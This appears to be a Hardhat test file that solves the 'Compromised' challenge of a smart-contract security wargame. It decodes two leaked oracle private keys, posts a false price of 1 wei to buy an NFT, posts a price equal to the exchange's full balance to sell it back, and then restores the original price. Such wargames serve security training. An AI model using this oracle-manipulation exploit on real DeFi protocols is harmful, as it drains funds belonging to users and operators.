const { expect } = require('chai');
const { ethers } = require('hardhat');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

// Source: https://www.w3resource.com/javascript-exercises/javascript-string-exercise-28.php
// Function to convert a hexadecimal string to its ASCII representation
function hex_to_ascii(str1) {
    // Convert the input hexadecimal string to a regular string
    var hex = str1.toString();
    // Initialize an empty string to store the resulting ASCII characters
    var str = '';
    // Iterate through the hexadecimal string, processing two characters at a time
    for (var n = 0; n < hex.length; n += 2) {
        // Extract two characters from the hexadecimal string and convert them to their ASCII equivalent
        str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
    }
    // Return the resulting ASCII string
    return str;
}

describe('Compromised challenge', function () {
    let deployer, player;
    let oracle, exchange, nftToken;

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
    const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();
        
        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        
        // Player starts with limited balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the oracle and setup the trusted sources with initial prices
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
        oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ['DVNFT', 'DVNFT', 'DVNFT'],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
            oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        nftToken = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
        expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
    });

    it('Execution', async function () {
        // The hints provided two encrypted 32 bytes private keys
        // To decrypt them: hint -> convert to ascii -> decode Base64 -> key

        enc_key1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
        enc_key2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"

        // Remove white spaces
        enc_key1 = enc_key1.replace(/\s/g, '');
        enc_key2 = enc_key2.replace(/\s/g, '');

        // Convert hex to ascii
        enc_key1 = hex_to_ascii(enc_key1);
        enc_key2 = hex_to_ascii(enc_key2);

        // Decode base64
        key1 = atob(enc_key1);
        key2 = atob(enc_key2);

        // Once decrypted, use the keys to set the prices of 2 of the 3 trusted oracles
        // This way we have complete control over the median of the price
        oracle1_account = new ethers.Wallet(key1, player.provider);
        oracle2_account = new ethers.Wallet(key2, player.provider);

        oracle1 = await oracle.connect(oracle1_account);
        oracle2 = await oracle.connect(oracle2_account);

        bestPrice = 1;

        // Set token price to what the user owns
        await oracle1.postPrice(await nftToken.symbol(), bestPrice);
        await oracle2.postPrice(await nftToken.symbol(), bestPrice);
        
        // Buy a token for cheap and get id from event
        playerExchange = await exchange.connect(player);
        txResult = await playerExchange.buyOne({value: bestPrice});
        txEvents = await txResult.wait();
        const event = txEvents.events.find(event => event.event === 'TokenBought');
        const [owner, tokenId, price] = event.args;

        exchangeBalance = await ethers.provider.getBalance(playerExchange.address);

        // Set token price to what the exchange owns
        await oracle1.postPrice(await nftToken.symbol(), exchangeBalance);
        await oracle2.postPrice(await nftToken.symbol(), exchangeBalance);

        // Approve and sell
        playerToken = await nftToken.connect(player);
        await playerToken.approve(exchange.address, tokenId);
        await playerExchange.sellOne(tokenId);

        // Set token price to the original price
        await oracle1.postPrice(await nftToken.symbol(), INITIAL_NFT_PRICE);
        await oracle2.postPrice(await nftToken.symbol(), INITIAL_NFT_PRICE);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(exchange.address)
        ).to.be.eq(0);
        
        // Player's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(player.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Player must not own any NFT
        expect(
            await nftToken.balanceOf(player.address)
        ).to.be.eq(0);

        // NFT price shouldn't have changed
        expect(
            await oracle.getMedianPrice('DVNFT')
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
